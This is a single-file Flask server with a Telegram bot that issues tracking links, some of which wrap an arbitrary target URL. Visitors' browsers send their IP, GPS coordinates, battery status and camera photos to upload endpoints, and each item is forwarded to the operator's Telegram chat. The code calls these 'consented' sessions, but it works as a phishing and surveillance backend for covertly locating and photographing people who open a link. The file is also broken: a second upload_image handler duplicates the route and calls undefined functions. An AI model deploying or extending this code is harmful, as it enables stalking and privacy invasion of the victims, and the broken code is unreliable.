# server.py - Flask app with Telegram webhook (single-file deploy)
import os
import uuid
import base64
import json
import requests
from datetime import datetime
from dotenv import load_dotenv
from flask import Flask, request, send_from_directory, render_template, jsonify, url_for, abort
from urllib.parse import urlparse

# load .env in development (optional)
load_dotenv()

# ---------- Configuration ----------
UPLOAD_DIR = "uploads"
SESSIONS_FILE = "sessions.json"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")  # required
# Secret path for webhook: set this env var to a random string in production
TELEGRAM_WEBHOOK_SECRET = os.environ.get("TELEGRAM_WEBHOOK_SECRET", "webhook_" + (TELEGRAM_BOT_TOKEN or "no-token")[:8])

os.makedirs(UPLOAD_DIR, exist_ok=True)

# ---------- Flask app ----------
app = Flask(__name__, template_folder="templates", static_folder="static")

# ---------- Persistence helpers ----------
def load_sessions():
    try:
        with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_sessions(sessions):
    try:
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(sessions, f)
    except Exception as e:
        print("Failed to save sessions:", e)

SESSIONS = load_sessions()

# ---------- Telegram helpers ----------
def telegram_api(method: str, data=None, files=None, timeout=30):
    if not TELEGRAM_BOT_TOKEN:
        return None, "no_token"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    try:
        r = requests.post(url, json=data if files is None else None, data=None if files is None else data, files=files, timeout=timeout)
        # when files is None we send JSON (telegram accepts JSON for sendMessage), else form-data
        return r, None
    except Exception as e:
        return None, str(e)

def tg_send_text(chat_id: str, text: str):
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return False
    payload = {"chat_id": chat_id, "text": text}
    r, err = telegram_api("sendMessage", data=payload)
    return bool(r and r.ok)

def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return False
    try:
        with open(photo_path, "rb") as f:
            files = {"photo": f}
            data = {"chat_id": str(chat_id)}
            if caption:
                data["caption"] = caption
            r, err = telegram_api("sendPhoto", data=data, files=files)
            return bool(r and r.ok)
    except Exception:
        return False

# ---------- URL validation ----------
def is_valid_http_url(u: str):
    try:
        p = urlparse(u)
        return p.scheme in ("http", "https") and bool(p.netloc)
    except Exception:
        return False

# ---------- Endpoints ----------
@app.route("/")
def index():
    return ("Flask server for consented device session. Use the Telegram bot to create sessions.", 200)

# Standard session creation
@app.route("/create", methods=["POST"])
def create_session():
    """
    JSON body: {"label": "...", "chat_id": "<telegram chat id (optional)>"}
    Returns: {"token": "...", "link": "..."}
    """
    data = request.get_json(silent=True) or {}
    label = data.get("label", "")
    chat_id = data.get("chat_id")
    token = uuid.uuid4().hex
    SESSIONS[token] = {
        "label": label,
        "created_at": datetime.utcnow().isoformat(),
        "visits": [],
        "chat_id": chat_id
    }
    save_sessions(SESSIONS)
    link = url_for("session_page", token=token, _external=True)
    if chat_id:
        tg_send_text(chat_id, f"Session created.\nToken: {token}\nOpen: {link}\nKeep permissions allowed while page is open.")
    return jsonify({"token": token, "link": link})

@app.route("/s/<token>")
def session_page(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    # If you have templates/session.html create it; fallback to simple text if missing
    try:
        return render_template("session.html", token=token)
    except Exception:
        return f"Session page for {token}", 200

# Wrapper creation (embed a target URL)
@app.route("/wrap_create", methods=["POST"])
def wrap_create():
    data = request.get_json(silent=True) or {}
    target_url = data.get("target_url", "").strip()
    if not is_valid_http_url(target_url):
        return jsonify({"error": "invalid_url"}), 400

    label = data.get("label", "")
    chat_id = data.get("chat_id")
    token = uuid.uuid4().hex
    SESSIONS[token] = {
        "label": label,
        "created_at": datetime.utcnow().isoformat(),
        "visits": [],
        "chat_id": chat_id,
        "target_url": target_url,
        "wrap": True
    }
    save_sessions(SESSIONS)
    link = url_for("wrapper_page", token=token, _external=True)
    if chat_id:
        tg_send_text(chat_id, f"Wrap session created for {target_url}\nOpen: {link}")
    return jsonify({"token": token, "link": link})

@app.route("/w/<token>")
def wrapper_page(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    target = SESSIONS[token].get("target_url", "")
    try:
        return render_template("wrapper.html", token=token, target_url=target)
    except Exception:
        return f"Wrapper page for {token} -> {target}", 200

# Upload endpoints
@app.route("/upload_info/<token>", methods=["POST"])
def upload_info(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    payload = request.get_json(silent=True) or {}
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip,
        "battery": payload.get("battery"),
        "coords": payload.get("coords")
    }
    SESSIONS[token]["visits"].append(entry)
    save_sessions(SESSIONS)

    chat_id = SESSIONS[token].get("chat_id")
    if chat_id:
        bat = entry.get("battery")
        coords = entry.get("coords")
        summary = f"Session {token} — info at {entry['timestamp']}\nIP: {ip}\nBattery: {bat}\nCoords: {coords}"
        tg_send_text(chat_id, summary)
    return jsonify({"status": "ok", "stored": entry})

@app.route("/upload_image/<token>", methods=["POST"])
def upload_image(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    data = request.get_json(silent=True) or {}
    b64 = data.get("image_b64", "")
    if not b64:
        return ("No image data", 400)
    if b64.startswith("data:"):
        try:
            b64 = b64.split(",", 1)[1]
        except Exception:
            return ("Bad data url", 400)
    try:
        imgbytes = base64.b64decode(b64)
    except Exception:
        return ("Bad base64", 400)

    # limit image size (reject if > 5 MB)
    if len(imgbytes) > 5_000_000:
        return ("Image too large", 413)

    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
    fname = f"{token}_{timestamp}.jpg"
    path = os.path.join(UPLOAD_DIR, fname)
    with open(path, "wb") as f:
        f.write(imgbytes)

    SESSIONS[token].setdefault("files", []).append(fname)
    save_sessions(SESSIONS)

    chat_id = SESSIONS[token].get("chat_id")
    if chat_id:
        caption = f"Session {token} — photo {timestamp}"
        sent = tg_send_photo(chat_id, path, caption=caption)
        if not sent:
            try:
                downloads_url = url_for("serve_upload", filename=fname, _external=True)
                tg_send_text(chat_id, f"Image saved: {downloads_url}")
            except Exception:
                pass

    return jsonify({"status": "saved", "filename": fname})

@app.route("/session_data/<token>")
def session_data(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    return jsonify(SESSIONS[token])

@app.route("/uploads/<filename>")
def serve_upload(filename):
    # Consider protecting this endpoint in production
    return send_from_directory(UPLOAD_DIR, filename)

# ---------- Telegram webhook endpoint ----------
@app.route(f"/telegram/{TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
def telegram_webhook():
    if not TELEGRAM_BOT_TOKEN:
        return "no token", 403
    update = request.get_json(silent=True)
    if not update:
        return "no json", 400

    # extract incoming message
    try:
        msg = update.get("message") or update.get("edited_message") or {}
        if not msg:
            return "ok", 200

        chat = msg.get("chat", {})
        chat_id = chat.get("id")
        text = msg.get("text", "").strip()
        if not text:
            return "ok", 200

        # /start
        if text.startswith("/start"):
            tg_send_text(chat_id, "Bot ready. Use /create <label> to create a session.")
            return "ok", 200

        # /create <label>
        if text.startswith("/create"):
            parts = text.split(maxsplit=1)
            label = parts[1] if len(parts) > 1 else ""
            # call internal create endpoint
            try:
                r = requests.post(url_for("create_session", _external=True), json={"label": label, "chat_id": str(chat_id)}, timeout=5)
                if r.ok:
                    data = r.json()
                    tg_send_text(chat_id, f"Session created.\nToken: {data['token']}\nOpen: {data['link']}\nKeep permissions allowed while page is open.")
                else:
                    tg_send_text(chat_id, f"Failed to create session: server returned {r.status_code}")
            except Exception as e:
                print("create command error:", e)
                tg_send_text(chat_id, "Failed to create session (server error).")
            return "ok", 200

        # /status <token>
        if text.startswith("/status"):
            parts = text.split(maxsplit=1)
            if len(parts) < 2:
                tg_send_text(chat_id, "Usage: /status <token>")
                return "ok", 200
            token = parts[1].strip()
            try:
                r = requests.get(url_for("session_data", token=token, _external=True), timeout=5)
                if r.status_code != 200:
                    tg_send_text(chat_id, f"Server returned status {r.status_code}: {r.text}")
                    return "ok", 200
                data = r.json()
                visits = data.get("visits", [])
                summary = f"Session {token}\nLabel: {data.get('label')}\nCreated: {data.get('created_at')}\nTotal events: {len(visits)}"
                # split long messages
                for chunk in (summary[i:i+4000] for i in range(0, len(summary), 4000)):
                    tg_send_text(chat_id, chunk)
                # optionally send last 5 events
                for v in visits[-5:]:
                    txt = f"{v.get('timestamp')}\nIP: {v.get('ip')}\nBattery: {v.get('battery')}\nCoords: {v.get('coords')}"
                    tg_send_text(chat_id, txt)
            except Exception as e:
                print("status command error:", e)
                tg_send_text(chat_id, f"Failed to fetch status: {e}")
            return "ok", 200

    except Exception as e:
        print("Telegram webhook error:", e)
    return "ok", 200
@app.route("/upload_image/<token>", methods=["POST"])
def upload_image(token):
    """
    Accepts JSON body:
      {
        "image_b64": "data:image/jpeg;base64,...",
        "coords": {"lat":..., "lon":..., "accuracy":...}  (optional),
        "battery": {"level":..., "charging":...}          (optional)
      }

    Saves file, records metadata into session, and notifies Telegram:
      - sends photo (preferred)
      - if sending photo fails, sends a text message with a download URL
    """
    if token not in SESSIONS:
        return "Invalid token", 404

    data = request.get_json(silent=True) or {}
    b64 = data.get("image_b64", "")
    coords = data.get("coords")
    battery = data.get("battery")

    if not b64:
        return ("No image data", 400)
    if b64.startswith("data:"):
        try:
            b64 = b64.split(",", 1)[1]
        except Exception:
            return ("Bad data url", 400)
    try:
        imgbytes = base64.b64decode(b64)
    except Exception:
        return ("Bad base64", 400)

    # limit image size (reject if > 10 MB)
    if len(imgbytes) > 10_000_000:
        return ("Image too large", 413)

    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
    fname = f"{token}_{timestamp}.jpg"
    path = os.path.join(UPLOAD_DIR, fname)
    try:
        with open(path, "wb") as f:
            f.write(imgbytes)
    except Exception as e:
        print("Failed to write image:", e)
        return ("Server error saving image", 500)

    # persist filename and metadata
    sess = SESSIONS[token]
    sess.setdefault("files", []).append(fname)
    meta = {"timestamp": timestamp, "filename": fname}
    if coords:
        meta["coords"] = coords
    if battery:
        meta["battery"] = battery
    sess.setdefault("images_meta", []).append(meta)
    save_sessions(SESSIONS)

    # Notify Telegram: prefer sending the photo (so it appears in chat)
    chat_id = sess.get("chat_id")
    if chat_id:
        caption_parts = [f"Session {token} — photo {timestamp}"]
        if coords:
            caption_parts.append(f"Coords: {coords.get('lat')},{coords.get('lon')} (acc {coords.get('accuracy')})")
        if battery:
            lev = battery.get("level")
            ch = battery.get("charging")
            caption_parts.append(f"Battery: {lev}%{' charging' if ch else ''}")
        caption = "\n".join(caption_parts)
        sent = telegram_send_photo(chat_id, path, caption=caption)
        if not sent:
            # fallback: send text with download link
            try:
                downloads_url = url_for("serve_upload", filename=fname, _external=True)
                telegram_send_message(chat_id, f"Image saved: {downloads_url}\n{caption}")
            except Exception:
                pass

    return jsonify({"status": "saved", "filename": fname, "meta": meta})

# ---------- Run ----------
if __name__ == "__main__":
    # Development server (do not use in production)
    debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=debug_mode)
